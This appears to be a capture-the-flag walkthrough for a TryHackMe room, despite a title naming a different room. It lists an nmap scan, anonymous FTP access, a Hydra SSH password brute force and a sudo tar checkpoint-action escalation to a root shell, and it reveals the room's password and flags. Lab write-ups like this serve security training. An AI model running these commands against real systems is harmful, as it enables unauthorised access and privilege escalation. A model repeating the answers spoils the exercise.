# Vulnversity Wlakthrough
### Link
- https://tryhackme.com/room/cowboyhacker
------------------------
- Find open ports on the machine
    - sudo nmap -sC -sV -p- [IP]
        - Port open : FTP / SSH / Web Server
        - Connect to FTP with anonymous user
        - Download files
        - analyze files
                locks.txt --> password list
                task.txt --> we found a name "lin"
- Who wrote the task list?
    - **Answer** : lin
- What service can you bruteforce with the text file found?
    - **Answer** : ssh
- What is the users password? 
    - Hydra
        - hydra -l lin -P locks.txt ssh://[IP]
    - **Answer** : RedDr4gonSynd1cat3
- user.txt
    - **Answer** : THM{CR1M3_SyNd1C4T3}
- root.txt
    - check what action are authorize with lin account
        - sudo -l
        - /bin/tar
        - Visit https://gtfobins.github.io/#
            - Search tar
            - Try : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
        - Escalate root privilege
        - Verify
            - id
        - Search root.txt
            - find / -name "root.txt" 2>/dev/null
    - **Answer** : THM{80UN7Y_h4cK3r}



